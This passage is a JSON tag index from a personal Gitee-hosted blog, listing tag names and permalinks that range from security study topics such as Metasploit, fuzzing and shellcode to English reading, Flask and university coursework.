linux","slug":"kali-linux","permalink":"https://gitee.com/michelle19l/michelle19l/tags/kali-linux/"},{"name":"nessus","slug":"nessus","permalink":"https://gitee.com/michelle19l/michelle19l/tags/nessus/"},{"name":"metasploit","slug":"metasploit","permalink":"https://gitee.com/michelle19l/michelle19l/tags/metasploit/"},{"name":"ms08_067","slug":"ms08-067","permalink":"https://gitee.com/michelle19l/michelle19l/tags/ms08-067/"},{"name":"虚拟机","slug":"虚拟机","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"Kali Linux","slug":"Kali-Linux","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Kali-Linux/"},{"name":"模糊测试","slug":"模糊测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"},{"name":"Fuzzer","slug":"Fuzzer","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Fuzzer/"},{"name":"Shellcode编写","slug":"Shellcode编写","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Shellcode%E7%BC%96%E5%86%99/"},{"name":"整数溢出漏洞","slug":"整数溢出漏洞","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"},{"name":"virtualenv","slug":"virtualenv","permalink":"https://gitee.com/michelle19l/michelle19l/tags/virtualenv/"},{"name":"notice","slug":"notice","permalink":"https://gitee.com/michelle19l/michelle19l/tags/notice/"},{"name":"Lightgbm","slug":"Lightgbm","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Lightgbm/"},{"name":"Flask","slug":"Flask","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Flask/"},{"name":"AFL","slug":"AFL","permalink":"https://gitee.com/michelle19l/michelle19l/tags/AFL/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"主题配置","slug":"主题配置","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"},{"name":"英语","slug":"英语","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%8B%B1%E8%AF%AD/"},{"name":"英语阅读","slug":"英语阅读","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%8B%B1%E8%AF%AD%E9%98%85%E8%AF%BB/"},{"name":"IDA","slug":"IDA","permalink":"https://gitee.com/michelle19l/michelle19l/tags/IDA/"},{"name":"ollydbg","slug":"ollydbg","permalink":"https://gitee.com/michelle19l/michelle19l/tags/ollydbg/"},{"name":"写作","slug":"写作","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%86%99%E4%BD%9C/"},{"name":"阅读","slug":"阅读","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E9%98%85%E8%AF%BB/"},{"name":"网安","slug":"网安","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%BD%91%E5%AE%89/"},{"name":"Power Designer","slug":"Power-Designer","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Power-Designer/"},{"name":"听力","slug":"听力","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%90%AC%E5%8A%9B/"},{"name":"计算方法","slug":"计算方法","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/"},{"name":"资料收集整理","slug":"资料收集整理","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86/"},{"name":"ollydbg使用入门","slug":"ollydbg使用入门","permalink":"https://gitee.com/michelle19l/michelle19l/tags/ollydbg%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/"},{"name":"寄存器","slug":"寄存器","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%AF%84%E5%AD%98%E5%99%A8/"},{"name":"linux","slug":"linux","permalink":"https://gitee.com/michelle19l/michelle19l/tags/linux/"},{"name":"工具","slug":"工具","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%B7%A5%E5%85%B7/"},{"name":"argparse","slug":"argparse","permalink":"https://gitee.com/michelle19l/michelle19l/tags/argparse/"},{"name":"命令行","slug":"命令行","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"},{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Qt/"},{"name":"大一","slug":"大一","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%80/"},{"name":"作业","slug":"作业","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E4%BD%9C%E4%B8%9A/"},{"name":"大作业","slug":"大作业","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%BD%9C%E4%B8%9A/"}]}